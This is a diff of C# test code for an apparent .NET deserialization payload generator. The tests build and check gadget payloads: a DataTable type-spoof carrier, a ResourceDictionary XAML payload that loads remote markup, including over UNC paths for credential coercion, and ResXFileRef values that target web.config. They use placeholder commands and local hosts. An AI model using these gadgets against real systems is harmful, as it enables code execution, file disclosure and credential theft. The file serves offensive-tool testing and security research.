+                    DataTableTypeSpoofGenerator.DefaultTargetAssembly, cellValue);
+            }
+            catch (Exception e) { caught = e; }
+            AssertTrue(caught != null, "a type name that does not resolve cannot rebuild the carrier");
+        }
+
+        // Serialize the benign carrier under the given type/assembly name and read it back.
+        private static object RoundTripCarrierUnderName(string formatter, string typeName,
+            string assemblyName, string cellValue)
+        {
+            System.Data.DataTable table = new System.Data.DataTable("x");
+            table.RemotingFormat = System.Data.SerializationFormat.Binary;
+            table.Columns.Add("x", typeof(object));
+            table.Rows.Add(new object[] { cellValue });
+            table.AcceptChanges();
+
+            var carrier = new SubclassNameCarrier(table, typeName, assemblyName);
+
+            if (formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
+                return SerializersHelper.SoapFormatter_deserialize(SerializersHelper.SoapFormatter_serialize(carrier));
+
+            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            using (var ms = new MemoryStream())
+            {
+                bf.Serialize(ms, carrier);
+                ms.Position = 0;
+                return bf.Deserialize(ms);
+            }
+        }
+
+        // Build a real payload for one gadget whose command produces the fire target's effect.
+        private static byte[] MarkerPayloadFor(string gadget, string formatter, FireTarget fire, List<string> extra)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = fire.Command;
+            ia.IsRawCmd = true;
+            ia.Test = false;
+            ia.ExtraArguments = extra ?? new List<string>();
+            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = gadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+            AssertTrue(r.Success, gadget + " -f " + formatter + " generates a marker payload: " + r.ErrorMessage);
+            return (byte[])r.Raw;
+        }
+
+        // ---- Editor defaults must BE the module's real defaults ------------------
+        //
+        // WHY THESE EXIST. NDesk.Options records no default (the validation is an opaque
+        // compiled lambda), so the interactive editor RECOVERS one from the option's help
+        // prose. That value is not decoration: pressing Generate EMITS it. A recovered
+        // value that is a truncation of the real default therefore ships a different
+        // payload than the command line does, with nothing failing anywhere -
+        // `DataTableTypeSpoof` shipped with the editor showing and emitting
+        // `--target-type System`, which generates a perfectly well-formed payload naming a
+        // type no target can resolve, so it simply never fired. Neither the generation
+        // matrix nor the fire rows could see it, because both drive the CLI path.
+        //
+        // Two checks, deliberately different in kind:
+        //   1. a cheap structural one over EVERY gadget and plugin option (below), and
+        //   2. a generation-equality one per gadget (further down), which is the one that
+        //      actually proves the emitted payload is unchanged.
+
+        // A recovered default has to be a COMPLETE value, not the front half of one. The
+        // property is parser-independent on purpose: whatever heuristic recovers the value,
+        // the character following it in the help text must end a value. A '.' only ends one
+        // when a space or the end of the text follows it, which is what separates the
+        // sentence in "Default: AES. e.g: ..." from the dots inside
+        // "Default: System.Data.Entity.Design...".
+        private static void EditorDefaultsAreCompleteValuesNotTruncations()
+        {
+            var problems = new List<string>();
+            int gadgetDefaults = 0, pluginDefaults = 0;
+
+            // The editor is built per module KIND (its third argument), and a plugin loaded
+            // as a gadget silently loads nothing at all - no exception, an empty field list,
+            // and an audit that reports success having checked zero plugins. The first
+            // version of this test did exactly that, so the two counts below are asserted
+            // separately: a half of this audit that stops covering anything has to fail.
+            foreach (var module in ModulesForDefaultAudit())
+            {
+                string name = module.Key;
+                bool isGadget = module.Value;
+
+                var editor = new ModuleEditor(null, null, isGadget, null, null);
+                List<EditableField> fields;
+                try { fields = editor.BuildFieldsForTest(name); }
+                catch (Exception e) { problems.Add(name + " could not be loaded in the editor: " + e.Message); continue; }
+                if (fields == null || fields.Count == 0)
+                {
+                    problems.Add(name + " loaded no fields in the editor (wrong module kind?)");
+                    continue;
+                }
+
+                foreach (EditableField f in fields)
+                {
+                    if (f == null || f.IsAction || !f.ModuleOwn || f.Label == "variant")
+                        continue;
+                    string value = f.Value;
+                    if (string.IsNullOrEmpty(value) || string.IsNullOrEmpty(f.Help))
+                        continue;
+
+                    if (isGadget) gadgetDefaults++; else pluginDefaults++;
+                    int at = f.Help.IndexOf(value, StringComparison.Ordinal);
+                    if (at < 0)
+                    {
+                        // A default that is not in the help at all is not necessarily wrong
+                        // (a flag's "true"/"" for instance), so this is not a failure; the
+                        // truncation check simply has nothing to measure.
+                        continue;
+                    }
+                    int after = at + value.Length;
+                    if (after < f.Help.Length && !EndsAValue(f.Help, after))
+                    {
+                        problems.Add(name + " --" + f.Label + ": the editor default \"" + value
+                            + "\" is cut short - the help continues with \""
+                            + f.Help.Substring(after, Math.Min(24, f.Help.Length - after))
+                            + "\". Quote the default in the option help so it is taken whole.");
+                    }
+                }
+            }
+
+            AssertTrue(gadgetDefaults > 0, "the audit checked gadget defaults (was " + gadgetDefaults + ")");
+            AssertTrue(pluginDefaults > 0, "the audit checked plugin defaults (was " + pluginDefaults + ")");
+            AssertTrue(problems.Count == 0,
+                "every editor default is a complete value (" + gadgetDefaults + " gadget, "
+                + pluginDefaults + " plugin):\n  " + string.Join("\n  ", problems.ToArray()));
+        }
+
+        // True when the character at `i` ends a value rather than continuing it.
+        private static bool EndsAValue(string help, int i)
+        {
+            char c = help[i];
+            if (c == '.')
+                return i + 1 >= help.Length || help[i + 1] == ' ';
+            return c == ' ' || c == ',' || c == ';' || c == ')' || c == '"' || c == '\''
+                || c == '\r' || c == '\n' || c == '/';
+        }
+
+        // Every module the editor can load, paired with its KIND (true = gadget). The kind
+        // is carried with the name because the editor needs it and getting it wrong loads
+        // nothing rather than failing.
+        private static List<KeyValuePair<string, bool>> ModulesForDefaultAudit()
+        {
+            var modules = new List<KeyValuePair<string, bool>>();
+            foreach (string g in GadgetRegistry.GetGadgetNames())
+            {
+                // "Generic" is the base generator, not a real gadget.
+                if (g == "Generic") continue;
+                modules.Add(new KeyValuePair<string, bool>(g, true));
+            }
+            foreach (string p in PluginRegistry.GetPluginNames())
+                modules.Add(new KeyValuePair<string, bool>(p, false));
+            return modules;
+        }
+
+        // The deep check: for every gadget, generating with NOTHING typed must produce the
+        // same payload as generating with the editor's pre-filled defaults passed
+        // explicitly. That is what "default" means, and it is the assertion that would have
+        // caught the DataTableTypeSpoof truncation immediately - the two payloads named
+        // different types.
+        //
+        // A gadget whose payload is not reproducible (the *FromFile family compiles an
+        // assembly, so every build differs) cannot be compared byte for byte; those are
+        // reported by name and still have to agree on success, so the set is visible
+        // instead of silently shrinking.
+        private static void EveryGadgetEditorDefaultMatchesTheGadgetsOwnDefault()
+        {
+            string csFixture = WriteTestArtifact("ysonet_editor_default_fixture.cs",
+                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
+            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
+            string contentFixture = ContentFixture();
+
+            var problems = new List<string>();
+            var notReproducible = new List<string>();
+            int compared = 0;
+
+            try
+            {
+                foreach (string name in GadgetRegistry.GetGadgetNames())
+                {
+                    if (name == "Generic") continue;
+                    // A denial-of-service gadget is never built by an automatic sweep.
+                    if (DosPolicy.IsDosGadget(name)) continue;
+
+                    var editor = new ModuleEditor(null, null, true, null, null);
+                    editor.BuildFieldsForTest(name);
+                    List<string> editorArgs = editor.GadgetExtraArgvForTest();
+                    if (editorArgs == null || editorArgs.Count == 0)
+                        continue; // the editor pre-fills nothing: nothing to prove here
+
+                    IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                    string formatter = g.SupportedFormatters()[0].Split(' ')[0];
+                    string sample = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture, contentFixture);
+
+                    RunResult plain = GenerateWithExtraArgs(name, formatter, sample, new List<string>());
+                    RunResult plainAgain = GenerateWithExtraArgs(name, formatter, sample, new List<string>());
+                    RunResult withDefaults = GenerateWithExtraArgs(name, formatter, sample, editorArgs);
+
+                    string cell = name + " -f " + formatter + " (editor emits: " + string.Join(" ", editorArgs.ToArray()) + ")";
+
+                    if (plain.Success != withDefaults.Success)
+                    {
+                        problems.Add(cell + " -> passing the editor's defaults changed whether it generates ("
+                            + plain.Success + " -> " + withDefaults.Success + "): " + withDefaults.ErrorMessage);
+                        continue;
+                    }
+                    if (!plain.Success)
+                        continue; // both refused for the same reason; the defaults changed nothing
+
+                    byte[] a = plain.Raw as byte[], b = plainAgain.Raw as byte[], c = withDefaults.Raw as byte[];
+                    if (a == null || b == null || c == null)
+                    {
+                        string sa = Convert.ToString(plain.Raw), sb = Convert.ToString(plainAgain.Raw), sc = Convert.ToString(withDefaults.Raw);
+                        if (sa != sb) { notReproducible.Add(name); continue; }
+                        compared++;
+                        if (sa != sc)
+                            problems.Add(cell + " -> the editor's defaults produce a different payload than no options at all");
+                        continue;
+                    }
+                    if (!BytesEqual(a, b)) { notReproducible.Add(name); continue; }
+                    compared++;
+                    if (!BytesEqual(a, c))
+                        problems.Add(cell + " -> the editor's defaults produce a different payload than no options at all");
+                }
+            }
+            finally
+            {
+                try { File.Delete(csFixture); } catch { }
+                try { File.Delete(contentFixture); } catch { }
+            }
+
+            if (notReproducible.Count > 0)
+                Console.WriteLine("    [info] payload not byte-reproducible, compared on success only ("
+                    + notReproducible.Count + "): " + string.Join(", ", notReproducible.ToArray()));
+
+            AssertTrue(compared > 0, "the audit compared real payloads (was " + compared + ")");
+            AssertTrue(problems.Count == 0,
+                "the editor's defaults build the same payload as no options (" + compared + " compared):\n  "
+                + string.Join("\n  ", problems.ToArray()));
+        }
+
+        private static RunResult GenerateWithExtraArgs(string gadget, string formatter, string cmd, List<string> extra)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = cmd;
+            ia.Test = false;
+            ia.ExtraArguments = new List<string>(extra);
+            GenerationRequest req = new GenerationRequest
+            {
+                GadgetName = gadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            };
+            return PayloadRunner.GenerateGadget(req);
+        }
+
+        // The helper the two checks above rest on, tested directly so its rule is pinned
+        // rather than inferred from a gadget's behaviour.
+        private static void ParseDefaultKeepsDottedValuesWhole()
+        {
+            // A dotted type name is ONE value: a period only ends it when a space or the
+            // end of the text follows. This is the bug DataTableTypeSpoof shipped with.
+            AssertEqual("System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection",
+                EditableField.ParseDefault("Must be a DataTable subclass. Default: System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection. Second profile: x"),
+                "a dotted default is taken whole and still stops at the sentence end");
+
+            // The same rule for a file name with an extension (ResxPlugin's --of).
+            AssertEqual("payload.resources",
+                EditableField.ParseDefault("a file path location for CompiledDotResources to store the .resources file (default: payload.resources)"),
+                "a dotted file name keeps its extension");
+
+            // A sentence-ending period still ends the value.
+            AssertEqual("AES",
+                EditableField.ParseDefault("Enter the decryption from the web.config. Default: AES. e.g: AES/DES/3DES"),
+                "a period followed by a space still ends the value");
+
+            // A comma always ends an unquoted value, which is why an assembly identity has
+            // to be quoted in the help.
+            AssertEqual("System.Data.Entity.Design",
+                EditableField.ParseDefault("Default: System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral"),
+                "an unquoted comma-bearing value is still cut at the comma");
+            AssertEqual("System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                EditableField.ParseDefault("Assembly identity. Default: \"System.Data.Entity.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\""),
+                "a quoted default is taken whole, commas and all");
+
+            // Unchanged behaviour for the ordinary cases.
+            AssertEqual("false", EditableField.ParseDefault("Whether to run payload locally. Default: false"),
+                "a plain word default is unchanged");
+            AssertEqual("", EditableField.ParseDefault("no default mentioned here"),
+                "prose without a 'Default:' marker yields nothing");
+        }
+
+        // Generate DataTableTypeSpoof with a never-executed placeholder command. Pass null for
+        // any of variant / type / assembly to leave that option off the command line entirely,
+        // which is what proves the defaults.
+        private static RunResult GenerateDataTableTypeSpoof(string formatter, bool minify, int? variant,
+            string targetType, string targetAssembly)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            ia.Minify = minify;
+
+            var extra = new List<string>();
+            if (variant.HasValue) { extra.Add("--variant"); extra.Add(variant.Value.ToString()); }
+            if (targetType != null) { extra.Add("--target-type"); extra.Add(targetType); }
+            if (targetAssembly != null) { extra.Add("--target-assembly"); extra.Add(targetAssembly); }
+            ia.ExtraArguments = extra;
+
+            GenerationRequest req = new GenerationRequest
+            {
+                GadgetName = "DataTableTypeSpoof",
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            };
+            return PayloadRunner.GenerateGadget(req);
+        }
+
+        // One searchable form of a payload, per output encoding. BinaryFormatter and
+        // SoapFormatter payloads are readable as ASCII directly; LosFormatter output is base64
+        // text, so a search for a type name over the raw value silently finds nothing.
+        private static string SearchableWire(RunResult r, string formatter)
+        {
+            string text = r.Raw is byte[]
+                ? Encoding.ASCII.GetString((byte[])r.Raw)
+                : Convert.ToString(r.Raw);
+            if (formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase))
+                return Encoding.ASCII.GetString(Convert.FromBase64String(text.Trim()));
+            return text;
         }
 
         // ---- TypeConfuseDelegate root-container variants -----------------------
@@ -2817,20 +3583,16 @@ namespace ysonet.Tests
         // Every declared variant must generate from the variant flag ALONE. A gadget's
         // var/variant number is its own; it must never be consumed by a hardcoded inner gadget
         // that happens to use the same option name (GenericGenerator.GenerateInner is what
-        // keeps them apart). The FULL matrix cannot catch this because it always passes
-        // --xamlurl alongside the variant, which is exactly the option the leak needed; this
-        // test deliberately passes nothing but the variant.
+        // keeps them apart). This test deliberately passes nothing but the variant.
         //
         // Scoped to gadgets whose -c is a shell command or unused, so it stays fast and does
         // not invoke the C# compiler. The file/dll-input gadgets are covered by the FULL matrix.
         private static void EveryVariantGeneratesFromTheVariantFlagAlone()
         {
-            // ObjectDataProvider variant 3 is the SSRF variant: --xamlurl is its genuine input,
-            // not a leaked outer option. It is the only legitimate exception.
-            var needsOwnExtraInput = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
-            {
-                "ObjectDataProvider|3",
-            };
+            // Every declared variant builds from its number alone. There used to be one
+            // exception here, ObjectDataProvider variant 3, whose real input arrived through
+            // --xamlurl; that variant is now the ResourceDictionary gadget and takes a -c.
+            var needsOwnExtraInput = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
 
             var failures = new List<string>();
             int checkedCells = 0;
@@ -5025,6 +5787,1597 @@ namespace ysonet.Tests
             }
         }
 
+        // ---- ResourceDictionary (Source fetch and remote markup load) -----------
+
+        private const string RdGadget = "ResourceDictionary";
+
+        private static RunResult GenerateResourceDictionary(string uri, bool minify, params string[] extra)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = uri;
+            ia.Minify = minify;
+            ia.Test = false;
+            if (extra != null && extra.Length > 0) ia.ExtraArguments = new List<string>(extra);
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = RdGadget,
+                FormatterName = "Xaml",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // The whole payload is one element with one attribute, and the attribute is operator
+        // data the target OPENS - so what matters is that the value arrives byte for byte,
+        // through the XML escaping and through the minifier, for every shape an operator can
+        // legitimately type.
+        private static void ResourceDictionaryCarriesTheUriUnmodified()
+        {
+            string[] values =
+            {
+                "http://127.0.0.1:8080/x.xaml",
+                // A UNC path: the credential-coercion use, and backslashes must not be touched.
+                @"\\host\share\x",
+                // A bare target path, the third accepted input.
+                @"C:\payloads\x.xaml",
+                // & and < are the two characters that MUST be escaped for the attribute, and
+                // an apostrophe is the one an over-eager JSON escaper would corrupt.
+                "http://127.0.0.1/x?a=1&b=2",
+                "http://127.0.0.1/John's.xaml",
+            };
+
+            foreach (string uri in values)
+            {
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+                    string cell = uri + (minify ? " --minify" : "");
+
+                    RunResult r = GenerateResourceDictionary(uri, minify);
+                    AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);
+
+                    string text = r.Raw as string;
+                    AssertTrue(text != null, cell + ": the Xaml payload is text");
+                    AssertTrue(text.IndexOf("System.Windows.ResourceDictionary", StringComparison.Ordinal) < 0,
+                        cell + ": the element resolves through the WPF xmlns, so no assembly "
+                            + "qualified name is written");
+                    AssertTrue(text.IndexOf("ResourceDictionary", StringComparison.Ordinal) >= 0,
+                        cell + ": the payload names the carrier element");
+
+                    // Compare the DECODED attribute value, which is what the target's Uri
+                    // converter will see, not the escaped rendering.
+                    List<string> attributes = MinifiedTextGuardValues(text);
+                    AssertTrue(attributes.Contains(uri),
+                        cell + ": the URI reaches Source exactly as typed. Attribute values seen: "
+                            + string.Join(" | ", attributes.ToArray()));
+                }
+            }
+        }
+
+        // Every XML attribute and text value in a document, read back decoded. Mirrors what
+        // the gadget's own minify guard compares against.
+        private static List<string> MinifiedTextGuardValues(string xml)
+        {
+            var values = new List<string>();
+            var settings = new System.Xml.XmlReaderSettings
+            {
+                ConformanceLevel = System.Xml.ConformanceLevel.Fragment,
+                DtdProcessing = System.Xml.DtdProcessing.Ignore,
+            };
+            using (var sr = new StringReader(xml))
+            using (System.Xml.XmlReader reader = System.Xml.XmlReader.Create(sr, settings))
+            {
+                while (reader.Read())
+                {
+                    if (reader.NodeType == System.Xml.XmlNodeType.Text)
+                        values.Add(reader.Value);
+                    else if (reader.NodeType == System.Xml.XmlNodeType.Element && reader.HasAttributes)
+                    {
+                        while (reader.MoveToNextAttribute()) values.Add(reader.Value);
+                        reader.MoveToElement();
+                    }
+                }
+            }
+            return values;
+        }
+
+        // The two refusals this gadget owns, and they are the only two. Everything else about
+        // the operator's value is taken as typed (Generators/README.md, "Operator input:
+        // document it, do not police it") - no scheme check, no host form, no extension.
+        private static void ResourceDictionaryRefusesOnlyWhatItCannotEmit()
+        {
+            RunResult empty = GenerateResourceDictionary("", false);
+            AssertTrue(!empty.Success, "an empty -c is refused");
+            AssertTrue((empty.ErrorMessage ?? "").IndexOf("non-empty -c", StringComparison.OrdinalIgnoreCase) >= 0,
+                "and the refusal names the input: " + empty.ErrorMessage);
+
+            // --minify collapses "; " inside an attribute, so a value holding one would reach
+            // the target changed. Verified, not predicted: the gadget re-reads its own emitted
+            // document rather than pattern matching the input.
+            const string lossy = "http://127.0.0.1/a; b";
+            RunResult minified = GenerateResourceDictionary(lossy, true);
+            AssertTrue(!minified.Success, "a value --minify would rewrite is refused");
+            AssertTrue((minified.ErrorMessage ?? "").IndexOf("--minify", StringComparison.Ordinal) >= 0
+                    && (minified.ErrorMessage ?? "").IndexOf(lossy, StringComparison.Ordinal) >= 0,
+                "and the refusal names both the switch and the value: " + minified.ErrorMessage);
+
+            // The SAME value is fine without --minify, which is what proves the refusal is
+            // about the minifier and not about the character.
+            RunResult plain = GenerateResourceDictionary(lossy, false);
+            AssertTrue(plain.Success, "and the same value generates without --minify: " + plain.ErrorMessage);
+
+            // Shapes a validating gadget would have rejected and this one must not.
+            foreach (string odd in new[] { "not-a-url", "ftp://h/x", @"..\relative\x", "x" })
+            {
+                RunResult r = GenerateResourceDictionary(odd, false);
+                AssertTrue(r.Success, "\"" + odd + "\" is the target's decision, not ysonet's: " + r.ErrorMessage);
+            }
+        }
+
+        // --rawinput turns the attribute escaping off, and with it the minify guard, because
+        // the operator has taken the escaping decision themselves.
+        private static void ResourceDictionaryRawInputSkipsTheEscaping()
+        {
+            const string preEscaped = "http://127.0.0.1/x?a=1&amp;b=2";
+
+            RunResult escaped = GenerateResourceDictionary("http://127.0.0.1/x?a=1&b=2", false);
+            AssertTrue(escaped.Success, "the normal path generates: " + escaped.ErrorMessage);
+            AssertTrue(((string)escaped.Raw).IndexOf("&amp;", StringComparison.Ordinal) >= 0,
+                "and escapes the ampersand for the attribute");
+
+            RunResult raw = GenerateResourceDictionary(preEscaped, false, "--rawinput");
+            AssertTrue(raw.Success, "--rawinput generates: " + raw.ErrorMessage);
+            AssertTrue(((string)raw.Raw).IndexOf(preEscaped, StringComparison.Ordinal) >= 0,
+                "and passes an already-escaped value through untouched: " + raw.Raw);
+        }
+
+        // The formatter list is Xaml and nothing else, and the reasons are asserted rather
+        // than argued, because each one is a cell somebody could later "add" in good faith.
+        private static void ResourceDictionaryAdvertisesOnlyXamlAndWhy()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(RdGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+
+            List<string> formatters = g.SupportedFormatters();
+            AssertEqual(1, formatters.Count, "exactly one advertised formatter");
+            AssertEqual("Xaml", formatters[0], "and it is Xaml");
+
+            Type rd = typeof(System.Windows.ResourceDictionary);
+
+            // Reason 1, the SILENT one and so the dangerous one: a serializer that infers a
+            // contract from the type builds a DICTIONARY, because ResourceDictionary
+            // implements IDictionary. It really does construct the target and it really does
+            // read the document - it just stores "Source" as a KEY and never calls the setter.
+            // No exception, nothing fetched. A generation-only or did-it-throw check passes.
+            AssertTrue(typeof(System.Collections.IDictionary).IsAssignableFrom(rd),
+                "ResourceDictionary implements IDictionary, which is what routes named members "
+                    + "into the dictionary");
+
+            const string jsonAttempt = @"{
+    ""$type"":""System.Windows.ResourceDictionary, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
+    ""Source"":""http://127.0.0.1:1/x""
+}";
+            object built = SerializersHelper.JsonNet_deserialize(jsonAttempt);
+            var asDictionary = built as System.Windows.ResourceDictionary;
+            AssertTrue(asDictionary != null,
+                "Json.NET DOES build the target type, which is why this cell looks like it works");
+            AssertTrue(asDictionary.Source == null,
+                "but Source is never assigned, so nothing is fetched");
+            AssertEqual(1, asDictionary.Count,
+                "the member landed in the dictionary as a key instead");
+
+            // Reason 2: the runtime formatters reject the TYPE before they create anything,
+            // so no document shape helps.
+            AssertTrue(!rd.IsSerializable,
+                "ResourceDictionary is not [Serializable], which rules out BinaryFormatter, "
+                    + "SoapFormatter, LosFormatter and FsPickler");
+
+            // Reason 3: XmlSerializer refuses it by name, and says why.
+            Exception xs = null;
+            try { new System.Xml.Serialization.XmlSerializer(rd); }
+            catch (Exception ex) { xs = ex; }
+            AssertTrue(xs != null, "XmlSerializer refuses the type");
+            Exception xsRoot = xs;
+            while (xsRoot.InnerException != null) xsRoot = xsRoot.InnerException;
+            AssertTrue(xsRoot.Message.IndexOf("IDictionary", StringComparison.Ordinal) >= 0,
+                "and names IDictionary as the reason: " + xsRoot.Message);
+
+            // Reason 4: the DataContract family writes a key/value COLLECTION, which has no
+            // place to name a member at all.
+            var probe = new System.Windows.ResourceDictionary();
+            probe.Add("k", "v");
+            var dcsMs = new MemoryStream();
+            new System.Runtime.Serialization.DataContractSerializer(rd).WriteObject(dcsMs, probe);
+            string dcs = Encoding.UTF8.GetString(dcsMs.ToArray());
+            AssertTrue(dcs.IndexOf("ArrayOfKeyValueOfanyTypeanyType", StringComparison.Ordinal) >= 0,
+                "DataContractSerializer builds a collection contract: " + dcs);
+            AssertTrue(dcs.IndexOf("Source", StringComparison.Ordinal) < 0,
+                "with no member named Source anywhere in it");
+        }
+
+        // The metadata an operator searches on. Each value has a reason a future edit could
+        // quietly break, so it is locked here rather than left to the generic audit table.
+        private static void ResourceDictionaryDeclaresItsFacets()
+        {
+            var g = GadgetRegistry.CreateGadgetInstance(RdGadget) as GenericGenerator;
+            AssertTrue(g != null, "the gadget loads");
+
+            AssertEqual(CommandInputType.Url, g.CommandInput(),
+                "-c is described as a URL, the primary documented use");
+            AssertEqual(0, g.Variants().Count,
+                "one payload shape: the URL and UNC uses emit identical bytes");
+
+            GadgetFacetSet facets = g.Facets();
+            AssertTrue(facets.Kinds.Contains(PayloadKind.Network),
+                "the request leaves the process before anything is parsed");
+            AssertTrue(facets.Kinds.Contains(PayloadKind.CodeExecution),
+                "and the fetched document is then loaded as WPF markup, which "
+                    + "FireResourceDictionaryLoadsRemoteMarkup proves by constructing a type "
+                    + "named only inside it");
+            AssertTrue(facets.Kinds.Contains(PayloadKind.NestedDeserialization),
+                "that load is a second deserializer reading operator-controlled input");
+
+            // Inputs are DECLARED, not derived: CommandInput() is Url but a UNC path and a
+            // plain target path are equally valid values, and an operator hunting for the
+            // credential-coercion use searches for the UNC one.
+            AssertTrue(facets.Inputs != null, "the inputs are declared rather than derived");
+            foreach (string input in new[] { PayloadInput.RemoteUrl, PayloadInput.UncPath, PayloadInput.TargetPath })
+                AssertTrue(facets.Inputs.Contains(input), "declares the " + input + " input");
+
+            AssertTrue(facets.Requirements.Contains(GadgetRequirement.Wpf),
+                "PresentationFramework is a WPF assembly");
+            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
+                "and it ships with the framework");
+
+            // Versions are evidence: the fire rows record what actually fired and
+            // VersionEvidenceMatchesThisRuntime fails the run when a claim and the observation
+            // disagree.
+            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
+                "a runtime-gated gadget names at least one working version");
+            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
+                "4.8.1 is the build the effect was observed on");
+
+            AssertTrue(g.AdditionalInfo().IndexOf("UNC", StringComparison.OrdinalIgnoreCase) >= 0,
+                "AdditionalInfo names the credential-coercion use, which the facets alone do not explain");
+            AssertInfoPanelKeepsItsFacts(RdGadget);
+        }
+
+        // ---- ResXFileRef (the ResXFileRef.Converter primitive) ------------------
+
+        private const string ResXFileRefGadget = "ResXFileRef";
+
+        // A .resources document is the natural -c for the default variant, but nothing here
+        // ever opens it: generation is text assembly only.
+        private const string ResXFileRefSamplePath = @"\\ysonet-nonexistent-host\share\stage.resources";
+
+        private static RunResult GenerateResXFileRef(string formatter, string path, bool minify,
+            params string[] extra)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = path;
+            ia.Minify = minify;
+            ia.Test = false;
+            if (extra != null && extra.Length > 0) ia.ExtraArguments = new List<string>(extra);
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = ResXFileRefGadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // The one string the target's converter parses, read back out of the payload: the
+        // decoded text node for XAML, the unquoted scalar for YAML.
+        private static string ResXFileRefDeliveredValue(string payload, string formatter)
+        {
+            if (formatter == "Xaml")
+            {
+                var settings = new System.Xml.XmlReaderSettings
+                {
+                    ConformanceLevel = System.Xml.ConformanceLevel.Fragment,
+                    DtdProcessing = System.Xml.DtdProcessing.Ignore,
+                };
+                using (var sr = new StringReader(payload))
+                using (System.Xml.XmlReader reader = System.Xml.XmlReader.Create(sr, settings))
+                {
+                    while (reader.Read())
+                        if (reader.NodeType == System.Xml.XmlNodeType.Text)
+                            return reader.Value;
+                }
+                return null;
+            }
+
+            // The YAML document is one tagged scalar: everything from the first '"' after the
+            // tag to the last one, read back through YamlDotNet's own escaping rules by
+            // undoing the two escapes the gadget applies.
+            int open = payload.IndexOf('"');
+            int close = payload.LastIndexOf('"');
+            if (open < 0 || close <= open) return null;
+            return payload.Substring(open + 1, close - open - 1)
+                .Replace("\\\"", "\"").Replace("\\\\", "\\");
+        }
+
+        // What ResXFileRef.Converter.ParseResxFileRefString makes of a value. Internal, so
+        // this reaches it by reflection rather than reimplementing the rule the gadget is
+        // supposed to match - the whole point is to compare against the framework.
+        private static string[] ResXFileRefFrameworkParse(string value)
+        {
+            System.Reflection.MethodInfo parse = typeof(System.Resources.ResXFileRef.Converter)
+                .GetMethod("ParseResxFileRefString",
+                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
+            AssertTrue(parse != null, "the framework's own ResX file-reference parser is reachable");
+            return (string[])parse.Invoke(null, new object[] { value });
+        }
+
+        // The composed value IS the payload, so it has to be exactly what the framework
+        // itself would write - asserted against ResXFileRef.ToString() rather than against a
+        // copied literal, so the rule cannot drift - and it has to survive the framework's
+        // own parser, which is what the target really runs.
+        private static void ResXFileRefComposesTheConverterValue()
+        {
+            const string resourceSetType = ResXFileRefGenerator.ResourceSetTypeName;
+            const string activatedType = "System.IO.BufferedStream, mscorlib";
+
+            // path, extra arguments, the type name the target must resolve, the encoding.
+            var cells = new List<string[]>
+            {
+                new[] { ResXFileRefSamplePath, "", resourceSetType, "" },
+                // A path holding the field separator MUST be quoted, or the target would
+                // stop reading it at the first ';'.
+                new[] { @"C:\stage;01\payload.resources", "", resourceSetType, "" },
+                // And one holding a quote, which the same rule covers: the parser reads a
+                // quoted path up to the LAST '"', so it round-trips too.
+                new[] { "C:\\stage\"01\\payload.resources", "", resourceSetType, "" },
+                new[] { @"C:\inetpub\wwwroot\web.config", "--variant 1", "System.String", "" },
+                new[] { @"C:\inetpub\wwwroot\web.config", "--variant 1 --enc utf-8", "System.String", "utf-8" },
+                new[] { @"\\host\share\blob.bin", "--variant 3 --type " + activatedType,
+                    activatedType, "" },
+            };
+
+            foreach (string[] cell in cells)
+            {
+                string path = cell[0];
+                string[] extra = cell[1].Length == 0
+                    ? new string[0]
+                    // Only the --type value can contain a space, and it is always last.
+                    : SplitVariantArgs(cell[1]);
+                string typeName = cell[2];
+                string encodingName = cell[3];
+
+                var reference = encodingName.Length == 0
+                    ? new System.Resources.ResXFileRef(path, typeName)
+                    : new System.Resources.ResXFileRef(path, typeName,
+                        Encoding.GetEncoding(encodingName));
+                string expected = reference.ToString();
+
+                foreach (string formatter in new[] { "Xaml", "YamlDotNet" })
+                {
+                    string desc = formatter + " " + path + " " + cell[1];
+                    RunResult r = GenerateResXFileRef(formatter, path, false, extra);
+                    AssertTrue(r.Success, desc + " generates: " + r.ErrorMessage);
+
+                    string text = r.Raw as string;
+                    AssertTrue(text != null, desc + ": the payload is text");
+
+                    string delivered = ResXFileRefDeliveredValue(text, formatter);
+                    AssertEqual(expected, delivered,
+                        desc + ": the value is composed exactly as ResXFileRef.ToString() does");
+
